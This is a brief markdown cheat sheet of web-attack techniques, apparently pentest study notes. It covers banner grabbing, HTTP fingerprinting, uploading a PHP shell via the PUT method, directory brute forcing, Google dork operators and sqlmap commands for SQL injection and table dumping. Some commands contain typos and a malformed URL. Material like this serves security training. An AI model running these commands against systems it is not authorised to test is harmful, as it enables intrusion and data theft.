# Web Attacks


### Banner grabbing
```
nc -v <target> <port>
HEAD / HTTP/1.0
```

### HTTPS services
```
openssl s_client -connect <target>:<port>
HEAD / HTTP/1.0
```


### Fingerpriting with Httprint
```
httprint -P0 -h <target> -s <signature file>
```


### HTTP Verbs
```
GET, POST, HEAD, PUT, DELETE, OPTIONS
```

### Using PUT to upload shell
```
# Get the content length of the shell
wc -m shell.php
<payload content length output>

# Then using nc to upload with the PUT method
nc <target> <port>
PUT /payload.php HTTP/1.0
Content-type: text/html
Content-length: <length of payload>
```


### Directory and File Enumeration

Enumeration of files and directories can lead to many hidden resources that could contain:

- New and untested features
- Backup files
- Testing information
- Developer's notes

```
# Dirb is a great tool to use for directory/file brute forcing
dirb http://<target>

# Gobuster is another directory/file scanner written in Go
gobuster -u <target> -w <path to wordlist> -o <file to output to>
```

### Google Dorks
| Command               | Meaning                                                                                                     |
|-----------------------|-------------------------------------------------------------------------------------------------------------|
| site:                 | You can use this command to include only results on a given hostname.                                       |
| intitle:              | This command filters according to the title of a page.                                                      |
| inurl:                | Similar to intitle, but works on the URL of a resource.                                                     |
| filetype:             | This filters by using the file extension of a resource. For example .pdf or .xls.                           |
| AND, OR, &,           | You can use logical operators to combine your expressions. For example: site:example.com OR site:another.com |
| -                     | You can use this character to filter out a keyword or a command's result from the query.                    |

### SQL Injection with SQLMap

```
sqlmap -u <target> -p <paramater> [options]

# Example
sqlmap -u 'http://vicitim.site/search.php?id=2' -p id --technique=U

# Dump contents of a specific table in a database
sqlamp -u 'http://victim.site/search.php?=1' -D <database name> -T <table name> --dump
```




